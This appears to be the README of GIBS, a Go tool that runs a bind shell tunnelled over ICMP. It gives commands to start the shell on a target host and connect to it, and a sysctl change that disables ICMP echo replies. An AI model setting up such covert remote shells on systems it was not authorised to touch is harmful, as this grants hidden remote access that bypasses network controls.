# GIBS

The **G**o **I**CMP **B**ind **S**hell is a remote bindshell tunneled over ICMP. Although, since this is ICMP, we use raw sockets. It technically doesn't "bind" to any port, and requires root privileges to run.

### Usage

Set up the bindshell on a target host:

```
sudo gibs -bind-shell
```

Open a remote shell:

```
sudo gibs -host 127.0.0.1'
```

**Important note:** Right now, you *must* have automatic echo replies turned off. This prevents networks and kernels from filtering our extra ICMP responses as "duplicates".
```
# on linux
echo 1 | sudo tee /proc/sys/net/ipv4/icmp_echo_ignore_all

# todo: how to turn this off on osx without blocking icmp altogether?
```
